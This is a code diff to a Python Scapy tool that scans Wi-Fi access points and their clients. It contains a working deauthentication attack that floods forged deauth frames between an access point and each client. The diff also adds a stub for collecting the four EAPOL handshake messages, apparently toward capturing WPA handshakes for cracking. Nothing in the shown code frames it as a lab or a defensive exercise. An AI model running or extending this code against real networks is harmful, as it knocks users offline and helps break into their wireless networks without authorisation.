@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.dot11 import *
+from scapy.layers.eap import *
 import threading
 
 import scapy.packet
@@ -17,12 +18,19 @@ START_CHANNEL = 1
 
 class AccessPoint():
     
-    def __init__(self, ssid, bssid, signal_strength=0):
+    def __init__(self, ssid, bssid, signal_strength=0, channel=1):
         self.ssid = ssid
         self.bssid = bssid
         # List of clients (possibly) connected to the AP
         self.clients = []
         self.signal_strength = signal_strength
+        self.channel = channel
+        self.eapol_messages = {
+            1: [],
+            2: [],
+            3: [],
+            4: [],
+        }
 
     def update_signal_strength(self, dbm):
         self.signal_strength = dbm
@@ -35,6 +43,7 @@ def handle_beacon(pkt):
     bssid = pkt[Dot11].addr3
     ssid = pkt[Dot11Elt].info.decode()
     signal_strength = pkt[RadioTap].dBm_AntSignal
+    channel = pkt[RadioTap].Channel
 
     # Some APs have hidden SSIDs
     if not ssid:
@@ -42,7 +51,7 @@ def handle_beacon(pkt):
 
     if bssid not in ap_bssids:
         ap_bssids.add(bssid)
-        ap = AccessPoint(ssid, bssid, signal_strength)
+        ap = AccessPoint(ssid, bssid, signal_strength, channel)
         access_points.append(ap)
         bssid_map[bssid] = ap
         ssid_map[ssid] = ap
@@ -96,6 +105,20 @@ def handle_packet(pkt):
                 destination = pkt[Dot11].addr3
                 process_client_data_frame(source, destination)
 
+    # Handle EAPOL frame (handshake)
+    elif pkt.haslayer(EAPOL):
+        print(pkt)
+        match pkt[EAPOL].type:
+            # Distinguish different message types
+            case 1:
+                pass
+            case 2:
+                pass
+            case 3:
+                pass
+            case 4:
+                pass
+
 
 def process_client_data_frame(src, dest):
     if dest in bssid_map.keys() and dest != 'ff:ff:ff:ff:ff:ff':
@@ -107,8 +130,8 @@ def start_sniffing():
     sniff(iface=INTERFACE_NAME, prn=handle_packet, store=False, stop_filter=lambda x: stop_sniffing.is_set())
 
 
-def deauth(ap):
-    while True:
+def deauth(ap, stop):
+    while not stop.is_set():
         for client in ap.clients:
             ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=ap.bssid, addr2=client, addr3=ap.bssid)/Dot11Deauth()
             client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=ap.bssid, addr3=ap.bssid)/Dot11Deauth()
@@ -116,9 +139,9 @@ def deauth(ap):
             sendp(client_to_ap, iface=INTERFACE_NAME, verbose=False)
 
 
-def deauth_thread(ap):
-    threading.Thread(target=deauth, args=(ap,)).start()
-
+def deauth_thread(ap, stop):
+    thread = threading.Thread(target=deauth, args=(ap, stop,))
+    return thread
 
 
 access_points = []
@@ -130,17 +153,19 @@ bssid_map = {}
 ssid_map = {}
 
 stop_sniffing = threading.Event()
+stop_changing_channel = threading.Event()
+stop_deauthing = threading.Event()
 
-print('Starting GUI thread')
-gui_thread = threading.Thread(target=gui.start_gui, args=(get_aps, deauth_thread, stop_sniffing,))
-gui_thread.start()
+# print('Starting GUI thread')
+# gui_thread = threading.Thread(target=gui.start_gui, args=(get_aps, deauth_thread, stop_sniffing, stop_changing_channel, stop_deauthing,))
+# gui_thread.start()
 
 print('Starting sniffing thread')
 sniff_thread = threading.Thread(target=start_sniffing)
 sniff_thread.start()
 
 print('Starting channel switching thread')
-channel_thread = threading.Thread(target=change_channel, args=(START_CHANNEL, INTERFACE_NAME, stop_sniffing,))
+channel_thread = threading.Thread(target=change_channel, args=(START_CHANNEL, INTERFACE_NAME, stop_changing_channel,))
 channel_thread.start()
 
 sniff_thread.join()
